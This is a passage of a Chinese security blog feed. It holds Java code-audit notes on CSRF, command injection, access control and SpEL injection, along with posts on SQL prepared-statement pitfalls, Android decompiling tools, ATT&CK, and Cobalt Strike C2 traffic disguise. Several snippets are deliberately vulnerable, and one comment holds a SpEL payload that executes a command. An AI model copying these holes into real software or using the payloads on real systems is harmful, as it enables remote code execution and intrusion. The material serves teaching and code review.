title="修复方案"></a>修复方案</h3><ul><li>使用白名单校验重定向的url地址</li><li>给用户展示安全风险提示，并由用户再次确认是否跳转</li></ul><h2 id="0x07-CSRF"><a href="#0x07-CSRF" class="headerlink" title="0x07 CSRF"></a>0x07 CSRF</h2><h3 id="介绍-7"><a href="#介绍-7" class="headerlink" title="介绍"></a>介绍</h3><p>跨站请求伪造（Cross-Site Request Forgery，CSRF）是一种使已登录用户在不知情的情况下执行某种动作的攻击。因为攻击者看不到伪造请求的响应结果，所以CSRF攻击主要用来执行动作，而非窃取用户数据。当受害者是一个普通用户时，CSRF可以实现在其不知情的情况下转移用户资金、发送邮件等操作；但是如果受害者是一个具有管理员权限的用户时CSRF则可能威胁到整个Web系统的安全。</p><h3 id="漏洞示例-7"><a href="#漏洞示例-7" class="headerlink" title="漏洞示例"></a>漏洞示例</h3><p>由于开发人员对CSRF的了解不足，错把“经过认证的浏览器发起的请求”当成“经过认证的用户发起的请求”，当已认证的用户点击攻击者构造的恶意链接后就“被”执行了相应的操作。例如，一个博客删除文章是通过如下方式实现的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET http://blog.com/article/delete.jsp?id=102</span><br></pre></td></tr></table></figure><p>当攻击者诱导用户点击下面的链接时，如果该用户登录博客网站的凭证尚未过期，那么他便在不知情的情况下删除了id为102的文章，简单的身份验证只能保证请求发自某个用户的浏览器，却不能保证请求本身是用户自愿发出的。</p><h3 id="漏洞审计"><a href="#漏洞审计" class="headerlink" title="漏洞审计"></a>漏洞审计</h3><p>此类漏洞一般都会在框架中解决修复，所以在审计csrf漏洞时。首先要熟悉框架对CSRF的防护方案，一般审计时可查看增删改请求重是否有token、formtoken等关键字以及是否有对请求的Referer有进行校验。手动测试时,如果有token等关键则替换token值为自定义值并重放请求，如果没有则替换请求Referer头为自定义链接或置空。重放请求看是否可以成功返回数据从而判断是否存在CSRF漏洞。</p><h3 id="修复方案-7"><a href="#修复方案-7" class="headerlink" title="修复方案"></a>修复方案</h3><ul><li>Referer校验，对HTTP请求的Referer校验，如果请求Referer的地址不在允许的列表中，则拦截请求。</li><li>Token校验，服务端生成随机token，并保存在本次会话cookie中，用户发起请求时附带token参数，服务端对该随机数进行校验。如果不正确则认为该请求为伪造请求拒绝该请求。</li><li>Formtoken校验，Formtoken校验本身也是Token校验，只是在本次表单请求有效。</li><li>对于高安全性操作则可使用验证码、短信、密码等二次校验措施</li><li>增删改请求使用POST请求</li></ul><h2 id="0x08-命令执行"><a href="#0x08-命令执行" class="headerlink" title="0x08 命令执行"></a>0x08 命令执行</h2><h3 id="介绍-8"><a href="#介绍-8" class="headerlink" title="介绍"></a>介绍</h3><p>由于业务需求，程序有可能要执行系统命令的功能，但如果执行的命令用户可控，业务上有没有做好限制，就可能出现命令执行漏洞。</p><h3 id="漏洞示例-8"><a href="#漏洞示例-8" class="headerlink" title="漏洞示例"></a>漏洞示例</h3><p>此处以getRuntime为例，示例代码片段如下:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String cmd = request.getParameter(<span class="string">"cmd"</span>);</span><br><span class="line">Runtime.getRuntime().exec(cmd);</span><br></pre></td></tr></table></figure><h3 id="审计函数-6"><a href="#审计函数-6" class="headerlink" title="审计函数"></a>审计函数</h3><p>这种漏洞原理上很简单，重点是找到执行系统命令的函数，看命令是否可控。在一些特殊的业务场景是能判断出是否存在此类功能，这里举个典型的实例场景,有的程序功能需求提供网页截图功能，笔者见过多数是使用phantomjs实现，那势必是需要调用系统命令执行phantomjs并传参实现截图。而参数大多数情况下应该是当前url或其中获取相关参数，此时很有可能存在命令执行漏洞，还有一些其它比较特别的场景可自行脑洞。</p><p>java程序中执行系统命令的函数如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Runtime.exec</span><br><span class="line">ProcessBuilder.start</span><br><span class="line">GroovyShell.evaluate</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h3 id="修复方案-8"><a href="#修复方案-8" class="headerlink" title="修复方案"></a>修复方案</h3><ul><li>避免命令用户可控</li><li>如需用户输入参数，则对用户输入做严格校验，如&amp;&amp;、|、;等</li></ul><h2 id="0x09-权限控制"><a href="#0x09-权限控制" class="headerlink" title="0x09 权限控制"></a>0x09 权限控制</h2><h3 id="介绍-9"><a href="#介绍-9" class="headerlink" title="介绍"></a>介绍</h3><p>越权漏洞可以分为水平、垂直越权两种,程序在处理用户请求时未对用户的权限进行校验，使的用户可访问、操作其他相同角色用户的数据，这种情况是水平越权；如果低权限用户可访问、操作高权限用户则的数据，这种情况为垂直越权。</p><h3 id="漏洞示例-9"><a href="#漏洞示例-9" class="headerlink" title="漏洞示例"></a>漏洞示例</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping</span>(value=<span class="string">"/getUserInfo"</span>,method = RequestMethod.GET)</span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">getUserInfo</span><span class="params">(Model model, HttpServletRequest request)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    String userid = request.getParameter(<span class="string">"userid"</span>);</span><br><span class="line">    <span class="keyword">if</span>(!userid.isEmpty())&#123;</span><br><span class="line">        String info=userModel.getuserInfoByid(userid);</span><br><span class="line">        <span class="keyword">return</span> info;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">""</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="审计函数-7"><a href="#审计函数-7" class="headerlink" title="审计函数"></a>审计函数</h3><p>水平、垂直越权不需关注特定函数，只要在处理用户操作请求时查看是否有对当前登陆用户权限做校验从而确定是否存在漏洞</p><h3 id="修复方案-9"><a href="#修复方案-9" class="headerlink" title="修复方案"></a>修复方案</h3><p>获取当前登陆用户并校验该用户是否具有当前操作权限，并校验请求操作数据是否属于当前登陆用户，当前登陆用户标识不能从用户可控的请求参数中获取。</p><h2 id="0x10-批量请求"><a href="#0x10-批量请求" class="headerlink" title="0x10 批量请求"></a>0x10 批量请求</h2><h3 id="介绍-10"><a href="#介绍-10" class="headerlink" title="介绍"></a>介绍</h3><p>业务中经常会有使用到发送短信校验码、短信通知、邮件通知等一些功能，这类请求如果不做任何限制，恶意攻击者可能进行批量恶意请求轰炸，大量短信、邮件等通知对正常用户造成困扰，同时也是对公司的资源造成损耗。</p><p>除了短信、邮件轰炸等，还有一种情况也需要注意，程序中可能存在很多接口，用来查询账号是否存在、账号名与手机或邮箱、姓名等的匹配关系，这类请求如不做限制也会被恶意用户批量利用，从而获取用户数据关系相关数据。对这类请求在代码审计时可关注是否有对请求做鉴权、和限制即可大致判断是否存在风险。</p><h3 id="漏洞示例-10"><a href="#漏洞示例-10" class="headerlink" title="漏洞示例"></a>漏洞示例</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping</span>(value=<span class="string">"/ifUserExit"</span>,method = RequestMethod.GET)</span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">ifUserExit</span><span class="params">(Model model, HttpServletRequest request)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    String phone = request.getParameter(<span class="string">"phone"</span>);</span><br><span class="line">    <span class="keyword">if</span>(! phone.isEmpty())&#123;</span><br><span class="line">        <span class="keyword">boolean</span> ifex=userModel.ifuserExitByPhone(phone);</span><br><span class="line">        <span class="keyword">if</span> (!ifex)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"用户不存在"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"用户已被注册"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="修复方案-10"><a href="#修复方案-10" class="headerlink" title="修复方案"></a>修复方案</h3><ul><li>对同一个用户发起这类请求的频率、每小时及每天发送量在服务端做限制，不可在前端实现限制</li></ul><h2 id="0x11-第三方组件安全"><a href="#0x11-第三方组件安全" class="headerlink" title="0x11 第三方组件安全"></a>0x11 第三方组件安全</h2><h3 id="介绍-11"><a href="#介绍-11" class="headerlink" title="介绍"></a>介绍</h3><p>这个比较好理解，诸如Struts2、不安全的编辑控件、XML解析器以及可被其它漏洞利用的如commons-collections:3.1等第三方组件，这个可以在程序pom文件中查看是否有引入依赖。即便在代码中没有应用到或很难直接利用，也不应该使用不安全的版本，一个产品的周期很长，很难保证后面不会引入可被利用的漏洞点。</p><h3 id="修复方案-11"><a href="#修复方案-11" class="headerlink" title="修复方案"></a>修复方案</h3><ul><li>使用最新或安全版本的第三方组件</li></ul><h2 id="0x12-SPel注入"><a href="#0x12-SPel注入" class="headerlink" title="0x12 SPel注入"></a>0x12 SPel注入</h2><h3 id="介绍-12"><a href="#介绍-12" class="headerlink" title="介绍"></a>介绍</h3><p>Spel是Spring框架el表达式的缩写，当使用SpelExpressionParser解析spel表达式，且表达式可被外部控制，则可能导致SPel表达式注入从而造成RCE，如<a href="https://github.com/Cryin/Paper/blob/master/CVE-2018-1260%20spring-security-oauth2%20RCE%20Analysis.md" target="_blank" rel="noopener">CVE-2018-1260</a>就是spring-security-oauth2的一个SPel注入导致的RCE 。</p><h3 id="漏洞示例-11"><a href="#漏洞示例-11" class="headerlink" title="漏洞示例"></a>漏洞示例</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping</span>(path = <span class="string">"/elinjection"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SPelInjectionController</span> </span>&#123;</span><br><span class="line">    <span class="meta">@RequestMapping</span>(value=<span class="string">"/spel.html"</span>,method= RequestMethod.GET)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">SPelInjection</span><span class="params">(ModelMap modelMap, HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        String el=request.getParameter(<span class="string">"el"</span>);</span><br><span class="line">        <span class="comment">//el="T(java.lang.Runtime).getRuntime().exec(\"open /Applications/Calculator.app\")";</span></span><br><span class="line">        ExpressionParser PARSER = <span class="keyword">new</span> SpelExpressionParser();</span><br><span class="line">        Expression exp = PARSER.parseExpression(el);</span><br><span class="line">        <span class="keyword">return</span> (String)exp.getValue();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="修复方案-12"><a href="#修复方案-12" class="headerlink" title="修复方案"></a>修复方案</h3><ul><li>解析el表达式时，参数不要由外部用户输入</li></ul><h2 id="0x13-总结"><a href="#0x13-总结" class="headerlink" title="0x13 总结"></a>0x13 总结</h2><p>除了上述相关的漏洞，在代码审计的时候有时会遇到一些特别的漏洞，比如开发为了测试方便关闭掉了一些安全校验函数、甚至未彻底清除的一些预留后门及测试管理接口等。除此，框架本身的安全问题也是可以深挖。一些安全校验、安全解决方案也未必就毫无破绽的，即便存在一些安全解决，但开发人员有没有使用以及是否正确使用安全方案都是可能存在问题的点。大公司都有成熟的框架，一些基本的安全问题并不是太多，但设计层面上的安全及流程相关的问题却基本依赖开发的经验。流程相关的漏洞则有必要先熟悉应用本身的设计和逻辑，这块也是潜在的风险点。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Java敏感函数&quot;&gt;&lt;a href=&quot;#Java敏感函数&quot; class=&quot;headerlink&quot; title=&quot;Java敏感函数&quot;&gt;&lt;/a&gt;Java敏感函数&lt;/h1&gt;&lt;p&gt;因为最近开发插件见到了很多敏感函数，记录记录。&lt;/p&gt;
&lt;h2 id=&quot;0x00-XXE&quot;&gt;
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://bai-ren-1.github.io/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>SQL预编译失效</title>
    <link href="http://bai-ren-1.github.io/2020/07/16/SQL%E9%A2%84%E7%BC%96%E8%AF%91%E5%A4%B1%E6%95%88/"/>
    <id>http://bai-ren-1.github.io/2020/07/16/SQL%E9%A2%84%E7%BC%96%E8%AF%91%E5%A4%B1%E6%95%88/</id>
    <published>2020-07-16T12:51:53.000Z</published>
    <updated>2020-07-16T13:27:44.875Z</updated>
    
    <content type="html"><![CDATA[<h1 id="SQL预编译失效"><a href="#SQL预编译失效" class="headerlink" title="SQL预编译失效"></a>SQL预编译失效</h1><p>之前写了一篇《SQL预编译绕过》，其实这篇也没啥。只是提一下在某些特殊情况下，模板语句处理的不好其实也是会导致即使使用了预编译也会导致SQL注入的。</p><h2 id="0x00-动态拼接"><a href="#0x00-动态拼接" class="headerlink" title="0x00 动态拼接"></a>0x00 动态拼接</h2><p>语句参数是动态拼接的话，其实用不用SQL预编译都一个样：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">直接拼接（不安全的写法）</span><br><span class="line">String sql = &quot;select * from product where pname = &quot; + name;</span><br></pre></td></tr></table></figure><p>正确的做法是要进行参数绑定啦：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">参数绑定（安全的写法）</span><br><span class="line">String sql = &quot;select * from db_user where username = ?&quot;;</span><br><span class="line">PreparedStatement stmt = connection.prepareStatement(sql);</span><br><span class="line">stmt.setString(1,name);</span><br><span class="line">ResultSet rs = stmt.executeQuery();</span><br></pre></td></tr></table></figure><h2 id="0x01-order-by"><a href="#0x01-order-by" class="headerlink" title="0x01 order by"></a>0x01 order by</h2><p>order by 后面的语句，是不能够用<strong>预编译进行处理</strong>的，只能通过拼接进行操作，因此需要手动过滤：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">String sql = &quot;select * from userinfo where id = ? &quot;+&quot;order by &apos;&apos;&quot; + age + &quot;&apos; asc&apos;&quot; ;</span><br><span class="line">ps = conn.prepareStatement(sql);</span><br><span class="line">ps.setInt(1,id);</span><br><span class="line">rs = ps.executeQuery();</span><br></pre></td></tr></table></figure><p>所以假如上面没有对order by 的参数age进行过滤的话，就会照成SQL注入。</p><blockquote><p>所以渗透中看到sort等参数就很大可能存在SQL注入。</p></blockquote><p>order by后面不能参数绑定的原因：</p><ul><li>预编译又只有自动加引号的setString()方法，没有不加引号的方法；</li><li>order by后接的字段名不能有引号；</li></ul><p>所以如果order by后面的参数使用动态绑定，就会因为引号问题报语法错误。所以order by后面只能以动态拼接的方式来执行，但是很多傻逼开发不知道怎么过滤或者根本不知道得过滤，就导致一抓一个准。</p><h2 id="0x02-思考"><a href="#0x02-思考" class="headerlink" title="0x02 思考"></a>0x02 思考</h2><p>其实吧，结合上一篇总结起来，使用SQL预编译还会造成SQL注入就两个本质：</p><ul><li>模板使用了参数动态拼接，而不是参数绑定：这种情况分两种，第一种是开发是傻逼；第二种是上面的order by这种情况，不得不用动态拼接而他又没做好过滤。</li><li>没有配置好参数和编码，导致可以GBK宽字节绕过：详情看上一篇文章。</li></ul><h2 id="0x03-小结"><a href="#0x03-小结" class="headerlink" title="0x03 小结"></a>0x03 小结</h2><p>就写一下，因为很久没写了，很简单的问题。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;SQL预编译失效&quot;&gt;&lt;a href=&quot;#SQL预编译失效&quot; class=&quot;headerlink&quot; title=&quot;SQL预编译失效&quot;&gt;&lt;/a&gt;SQL预编译失效&lt;/h1&gt;&lt;p&gt;之前写了一篇《SQL预编译绕过》，其实这篇也没啥。只是提一下在某些特殊情况下，模板语句处理的
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://bai-ren-1.github.io/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>AndroidKiller配置</title>
    <link href="http://bai-ren-1.github.io/2020/06/29/AndroidKiller%E9%85%8D%E7%BD%AE/"/>
    <id>http://bai-ren-1.github.io/2020/06/29/AndroidKiller%E9%85%8D%E7%BD%AE/</id>
    <published>2020-06-29T14:49:16.000Z</published>
    <updated>2020-06-29T15:23:19.579Z</updated>
    
    <content type="html"><![CDATA[<h1 id="AndroidKiller配置"><a href="#AndroidKiller配置" class="headerlink" title="AndroidKiller配置"></a>AndroidKiller配置</h1><p>AndroidKiller挺老了，但是用了下真的好方便，加上一些配置后感觉老廉颇了。所以记录一下，后面为了方便我都叫他AK。先贴上吾爱上的工具改造参考贴：<a href="https://www.52pojie.cn/thread-726176-1-1.html" target="_blank" rel="noopener">https://www.52pojie.cn/thread-726176-1-1.html</a> ，改造的过程根据帖子实现即可。</p><h2 id="0x00-AK连接夜神"><a href="#0x00-AK连接夜神" class="headerlink" title="0x00 AK连接夜神"></a>0x00 AK连接夜神</h2><p>记录一下AK如何通过adb连接到夜神模拟器上。首先我们开启夜神模拟器，然后通过pid号获取到它的端口：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wmic process where (name like &apos;%%Nox.exe%%&apos;) get processid /value</span><br><span class="line">netstat -ano | findstr 11308 | findstr LISTENING</span><br></pre></td></tr></table></figure><blockquote><p>这里获取进程号是直接使用wmic实现的，但也可以手动去任务管理器中找到夜神模拟器的进程号。然后在第二条命令中，将夜神模拟器的进程号替换在第一个管道符后的findstr后即可找到夜神的监听端口号，这里找到的pid是11308。</p></blockquote><p><img src="/2020/06/29/AndroidKiller%E9%85%8D%E7%BD%AE/1.png" alt></p><p>上图中我们可以找到夜神模拟器的监听端口是26966。然后我们进入到AK的目录，使用AK中的adb的命令连接到刚才我们找到的夜神模拟器的监听端口上：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd E:\AndroidKiller\bin\adb</span><br><span class="line">adb.exe connect 127.0.0.1:26966</span><br></pre></td></tr></table></figure><blockquote><p>切记这里使用的是AK中的adb！因为有的人还有自己搭建的adb，包括夜神模拟器中也会有adb，注意区分。</p></blockquote><p><img src="/2020/06/29/AndroidKiller%E9%85%8D%E7%BD%AE/2.png" alt></p><p>上面显示连接AK成功，然后我们在AK中也可以看到成功搜索到了夜神模拟器：</p><p><img src="/2020/06/29/AndroidKiller%E9%85%8D%E7%BD%AE/3.png" alt></p><h2 id="0x01-夜神模拟器搭建frida"><a href="#0x01-夜神模拟器搭建frida" class="headerlink" title="0x01 夜神模拟器搭建frida"></a>0x01 夜神模拟器搭建frida</h2><p>frida是个无敌的框架，我导师叫我去学习一下。所以这里先记录一下搭建的过程：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m pip install -i https://pypi.tuna.tsinghua.edu.cn/simple/ frida frida-tools</span><br></pre></td></tr></table></figure><blockquote><p>这里用了个小trick就是pip安装也是可以通过i参数指定源的，这里选用清华的源就会下载快很多。</p></blockquote><p><img src="/2020/06/29/AndroidKiller%E9%85%8D%E7%BD%AE/4.png" alt></p><p>然鹅它卡在了安装frida安装的这一步，进行了查阅： <a href="https://www.jianshu.com/p/f91d92ce2b23" target="_blank" rel="noopener">https://www.jianshu.com/p/f91d92ce2b23</a> 。按照帖子的方法进行安装就可以了：</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;AndroidKiller配置&quot;&gt;&lt;a href=&quot;#AndroidKiller配置&quot; class=&quot;headerlink&quot; title=&quot;AndroidKiller配置&quot;&gt;&lt;/a&gt;AndroidKiller配置&lt;/h1&gt;&lt;p&gt;AndroidKiller挺老了，但
      
    
    </summary>
    
    
      <category term="Android" scheme="http://bai-ren-1.github.io/categories/Android/"/>
    
    
  </entry>
  
  <entry>
    <title>Android反编译工具</title>
    <link href="http://bai-ren-1.github.io/2020/06/16/Android%E5%8F%8D%E7%BC%96%E8%AF%91%E5%B7%A5%E5%85%B7/"/>
    <id>http://bai-ren-1.github.io/2020/06/16/Android%E5%8F%8D%E7%BC%96%E8%AF%91%E5%B7%A5%E5%85%B7/</id>
    <published>2020-06-16T13:21:25.000Z</published>
    <updated>2020-06-16T14:00:07.626Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Android反编译工具"><a href="#Android反编译工具" class="headerlink" title="Android反编译工具"></a>Android反编译工具</h1><p>在公司开始学习Android（业务驱动），下午做了两种简单的反编译的做法，这里简答记录一下（好久没写博客了休息一下）</p><h2 id="0x00-apktools"><a href="#0x00-apktools" class="headerlink" title="0x00 apktools"></a>0x00 apktools</h2><p>apktools的项目地址： <a href="https://bitbucket.org/iBotPeaches/apktool/downloads/" target="_blank" rel="noopener">https://bitbucket.org/iBotPeaches/apktool/downloads/</a> 。直接把最新版本的jar文件下载到本地，然后我们cd到apktools目录中使用下面命令就能看到使用说明。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar apktool_2.4.1.jar</span><br></pre></td></tr></table></figure><p><img src="/2020/06/16/Android%E5%8F%8D%E7%BC%96%E8%AF%91%E5%B7%A5%E5%85%B7/1.png" alt></p><p>然后我们指定d参数就能进行反编译啦：</p><p><img src="/2020/06/16/Android%E5%8F%8D%E7%BC%96%E8%AF%91%E5%B7%A5%E5%85%B7/2.png" alt></p><p>然后我们就能在当前目录下看到反编译出来的文件夹结果：</p><p><img src="/2020/06/16/Android%E5%8F%8D%E7%BC%96%E8%AF%91%E5%B7%A5%E5%85%B7/3.png" alt></p><p>可以看到反编译出来的是smali语言：</p><p><img src="/2020/06/16/Android%E5%8F%8D%E7%BC%96%E8%AF%91%E5%B7%A5%E5%85%B7/4.png" alt></p><h2 id="0x01-dex2jar搭配-jd-gui"><a href="#0x01-dex2jar搭配-jd-gui" class="headerlink" title="0x01 dex2jar搭配 jd-gui"></a>0x01 dex2jar搭配 jd-gui</h2><p>将安装包shabi.apk后缀改为.zip，解压后拷贝classes.dex文件到dex2jar文件目录下，</p><p><img src="/2020/06/16/Android%E5%8F%8D%E7%BC%96%E8%AF%91%E5%B7%A5%E5%85%B7/5.png" alt></p><p>cmd进入改目录，执行下面命令，会生成classes-dex2jar.jar文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dex2jar.bat classes.dex</span><br></pre></td></tr></table></figure><p><img src="/2020/06/16/Android%E5%8F%8D%E7%BC%96%E8%AF%91%E5%B7%A5%E5%85%B7/6.png" alt></p><p>使用 jd-gui 打开生成的jar.jar文件就能看到反编译出来的代码啦：</p><p><img src="/2020/06/16/Android%E5%8F%8D%E7%BC%96%E8%AF%91%E5%B7%A5%E5%85%B7/7.png" alt></p><p>这里看到的就是java代码啦，还是方便很多的。</p><h2 id="0x02-小结"><a href="#0x02-小结" class="headerlink" title="0x02 小结"></a>0x02 小结</h2><p>很简单的内容，记录一下练手。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Android反编译工具&quot;&gt;&lt;a href=&quot;#Android反编译工具&quot; class=&quot;headerlink&quot; title=&quot;Android反编译工具&quot;&gt;&lt;/a&gt;Android反编译工具&lt;/h1&gt;&lt;p&gt;在公司开始学习Android（业务驱动），下午做了两种简单的
      
    
    </summary>
    
    
      <category term="Android" scheme="http://bai-ren-1.github.io/categories/Android/"/>
    
    
  </entry>
  
  <entry>
    <title>ATT&amp;CK</title>
    <link href="http://bai-ren-1.github.io/2020/05/01/ATT&amp;CK/"/>
    <id>http://bai-ren-1.github.io/2020/05/01/ATT&amp;CK/</id>
    <published>2020-05-01T08:45:00.000Z</published>
    <updated>2020-05-03T10:27:34.380Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ATT-amp-CK"><a href="#ATT-amp-CK" class="headerlink" title="ATT&amp;CK"></a>ATT&amp;CK</h1><p>ATT&amp;CK在正式从事蓝军攻击队工作之前就一直有看过，但不知其所以然。现在对其有了一定的认识，就在这里浅析一下ATT&amp;CK。</p><h2 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00 简介"></a>0x00 简介</h2><p>以前以为ATT&amp;CK是玩了安全中最喜欢的字符替换，代表着ATTACK，但实际并非如此。ATT&amp;CK的定义如下：</p><blockquote><p> ATT&amp;CK（ Adversarial Tactics, Techniques, and Common Knowledge）是一个反映各个攻击生命周期的攻击行为的模型和知识库。 根据英文直译过来代表的就是“<strong>对抗技术、对抗技巧和常识</strong>”。</p></blockquote><p>所以呢，我们能看到其实ATT&amp;CK是一个<strong>攻击模型知识库</strong>，用来反映一次完整攻击的生命周期。</p><p>当然，不同的政企单位对ATT&amp;CK的定制是不尽相同的。有的把攻击划分为3阶段，有的是7阶段乃至9阶段。但毫无疑问的是，更多的覆盖到黑客的攻击手法，我们就能更全面地进行相应的防护。</p><h2 id="0x01-蓝军？红队？"><a href="#0x01-蓝军？红队？" class="headerlink" title="0x01 蓝军？红队？"></a>0x01 蓝军？红队？</h2><p>说起红蓝对抗，绝大多数的安全从业者肯定是毫不陌生的。大多人认为蓝色就是防守的，红色都是进攻的。但实际的情况应该是这样的：</p><blockquote><p>红军作为企业防守方，通过安全加固、攻击监测、应急处置等手段来保障企业安全，而蓝军作为攻击方，以发现安全漏洞，获取业务权限或数据为目标，利用各种攻击手段，试图绕过红军层层防护，达成既定目标。</p></blockquote><p>欧美采用红队（Red Team）代表攻击方，蓝队（Blue Team）代表防守方，颜色代表正好相反，常常容易让大家搞混。即蓝军 = 红队 = 攻击方。 </p><h2 id="0x02-MITRE-ATT-amp-CK"><a href="#0x02-MITRE-ATT-amp-CK" class="headerlink" title="0x02 MITRE ATT&amp;CK"></a>0x02 MITRE ATT&amp;CK</h2><p>MITRE ATT&amp;CK应该是最流量的攻击模型了。 MITRE是啥？</p><blockquote><p>MITRE是美国非盈利组织，除了协助进行多项网络安全相关研究，同时，也是运维CVE漏洞数据库背后的组织，而ATT&amp;CK框架的研究计划，是该组织在2015年5月发起。 </p></blockquote><p>这么牛逼的组织，他们构建的ATT&amp;CK架构自然有一定的借鉴和学习的地方。</p><h2 id="0x05-参考链接"><a href="#0x05-参考链接" class="headerlink" title="0x05 参考链接"></a>0x05 参考链接</h2><p><a href="https://paper.seebug.org/867/" target="_blank" rel="noopener">https://paper.seebug.org/867/</a> </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;ATT-amp-CK&quot;&gt;&lt;a href=&quot;#ATT-amp-CK&quot; class=&quot;headerlink&quot; title=&quot;ATT&amp;amp;CK&quot;&gt;&lt;/a&gt;ATT&amp;amp;CK&lt;/h1&gt;&lt;p&gt;ATT&amp;amp;CK在正式从事蓝军攻击队工作之前就一直有看过，但不知其所以然
      
    
    </summary>
    
    
      <category term="后渗透" scheme="http://bai-ren-1.github.io/categories/%E5%90%8E%E6%B8%97%E9%80%8F/"/>
    
    
  </entry>
  
  <entry>
    <title>Malleable_C2_Profile</title>
    <link href="http://bai-ren-1.github.io/2020/04/16/Malleable_C2_Profile/"/>
    <id>http://bai-ren-1.github.io/2020/04/16/Malleable_C2_Profile/</id>
    <published>2020-04-16T08:55:13.000Z</published>
    <updated>2020-06-29T13:13:37.255Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Malleable-C2-Profile"><a href="#Malleable-C2-Profile" class="headerlink" title="Malleable_C2_Profile"></a>Malleable_C2_Profile</h1><p>Malleable_C2_Profile是CobaltStrike中一种配置文件。目的是用来伪装流量，让通讯更加隐蔽。下面贴上  <a href="https://wbglil.gitbooks.io/cobalt-strike/content/cobalt-strikekuo-zhan/malleable-c2.html" target="_blank" rel="noopener">https://wbglil.gitbooks.io/cobalt-strike/content/cobalt-strikekuo-zhan/malleable-c2.html</a>  上的解释。</p><blockquote><p>Cobalt Strike的 Malleable-C2-Profiles配置文件是用来伪装流量，让通讯更加隐蔽和控制其行为的一种方式。</p><p>Beacon中使用http通信的payload由Malleable-C2-profile文件控制，关于Malleable-C2-profile，它是一个简单的配置文件，用来指定如何转换数据并将其存储在transaction中，转换和存储数据的相同配置文件也从transaction中提取和恢复。</p></blockquote><h2 id="0x00-加载方式"><a href="#0x00-加载方式" class="headerlink" title="0x00 加载方式"></a>0x00 加载方式</h2><p>首先贴上别人制作好的混淆profile，<a href="https://github.com/rsmudge/Malleable-C2-Profiles。加载profile的方式也很简单，在开启CobaltStrike（下面简称：CS）的命令时，在ip和密码后加上你的profile的路径就能让服务器通信时使用profile进行流量混淆达成隐藏的目的。如下所示：" target="_blank" 